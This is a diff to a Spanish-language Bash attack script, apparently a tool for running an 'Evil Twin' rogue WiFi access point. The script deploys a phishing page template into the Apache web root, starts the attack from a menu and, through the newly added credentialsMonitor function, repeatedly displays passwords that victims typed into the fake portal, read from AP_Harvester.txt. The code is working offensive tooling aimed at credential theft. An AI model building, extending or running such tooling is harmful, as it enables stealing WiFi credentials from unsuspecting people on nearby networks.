@@ -65,7 +65,8 @@ attack()
 	sleep 1 && echo -e "\n${yellowColour}Evil Twin gestionándose a través de sesión tmux:\n ${endColour}" && tmux list-sessions
 	sleep 1 && echo -e "\n${yellowColour}Iniciando servicios... ${endColour}" && sleep 1
 
-	service apache2 start && rm -r /var/www/html/* 2>/dev/null && cp Plantilla/* /var/www/html/ 2>/dev/null && tput cnorm
+	service apache2 start && rm -r /var/www/html/* 2>/dev/null && sleep 1
+	cp Plantilla/* /var/www/html 2>/dev/null && tput cnorm
 	chmod o+w -R /var/www/html
 }
 
@@ -86,6 +87,17 @@ cleaner()
 	service network-manager restart && service apache2 stop && rm -rf /var/www/html/* 2>/dev/null && tmux kill-session -t EvilTwin 2>/dev/null
 }
 
+credentialsMonitor()
+{
+	while true; do
+		clear && echo -e "${yellowColour}Monitorizando credenciales introducidas [$endColour${blueColour}Refresco de 5 segundos${endColour}${yellowColour}]: \n${endColour}"
+
+		if [ -f /var/www/html/AP_Harvester.txt ]; then
+			cat /var/www/html/AP_Harvester.txt
+		fi && sleep 5
+	done
+}
+
 menu()
 {
 	echo -e "$yellowColour╱╭╮╱╱╱╱╱╱╱╱╭╮╭━╮╭━╮" && sleep 0.06
@@ -98,8 +110,9 @@ menu()
 	echo -e "${blueColour}1) ${endColour}${grayColour}Iniciar ataque${endColour}" && sleep 0.06
 	echo -e "${blueColour}2) ${endColour}${grayColour}Reiniciar configuración${endColour}" && sleep 0.06
 	echo -e "${blueColour}3) ${endColour}${grayColour}Instalación de programas necesarios${endColour}" && sleep 0.06
+	echo -e "${blueColour}4) ${endColour}${grayColour}Monitorización de Credenciales Introducidas${endColour}" && sleep 0.06
 	echo -e "${blueColour}0) ${endColour}${grayColour}Salir del programa${endColour}" && sleep 0.06
-	echo -e "$redColour-------------------------------------$endColour" & sleep 1
+	echo -e "$redColour----------------------------------------------$endColour" & sleep 1
 	echo -ne "${yellowColour}Selecciona una opción:${endColour} " && tput cnorm
 	read option && tput civis
 }
@@ -118,6 +131,12 @@ if [ "$(id -u)" -eq "0" ]; then
 				;;
 
 			2) cleaner
+				;;
+
+			3) instalation
+				;;
+
+			4) credentialsMonitor
 				;;
 
 			0) exit
